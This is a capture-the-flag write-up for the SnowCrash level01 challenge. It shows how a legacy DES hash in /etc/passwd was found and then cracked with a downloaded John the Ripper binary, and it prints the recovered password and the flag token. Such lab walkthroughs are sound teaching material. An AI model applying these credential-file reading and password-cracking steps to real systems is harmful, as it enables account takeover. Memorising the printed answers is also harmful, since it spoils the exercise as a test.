## level01 writeup

One of the first place we looked when entering the environment was the `/etc/passwd` file.
```shell
$ cat /etc/passwd
...
flag00:x:3000:3000::/home/flag/flag00:/bin/bash
flag01:42hDRfypTqqnw:3001:3001::/home/flag/flag01:/bin/bash
...
```
The flag01 user has a hash instead of an x. In this [site](https://www.oreilly.com/library/view/practical-unix-and/0596003234/ch04s03.html), we learned that before the `/etc/shadow` file, passwords \
were encrypted with the `crypto()` function and stored directly in `/etc/passwd`. \
It uses a 2 character based salt and produces a 11 character hash with the DES algorithm. In this case, the salt is **42** and the hash is **hDRfypTqqnw**.

From the video, we learned we can use [john the ripper](https://github.com/magnumripper/JohnTheRipper) to break passwords.
We know we can create directories and execute binaries from `/tmp` (looking at the permissions.) \
So we do:
```shell
$ mkdir /tmp/myfs
$ cd /tmp/myfs
$ # we download a precompiled binary of john the ripper
$ wget https://download.openwall.net/pub/projects/john/contrib/linux/historical/john-1.7.9-jumbo-5-Linux-x86-32.tar.gz
$ tar -xf john-1.7.9-jumbo-5-Linux-x86-32.tar.gz
$ cd john-1.7.9-jumbo5-Linux-x86-32/run
$ # executing john on the etc/passwd file gives us the password because it knows how to break DES
$ ./john /etc/passwd
...
abcdefg          (flag01)
...
$ su flag01
abcdefg

flag01@SnowCrash:~$ getflag
Check flag.Here is your token : f2av5il02puano7naaf6adaaf
```
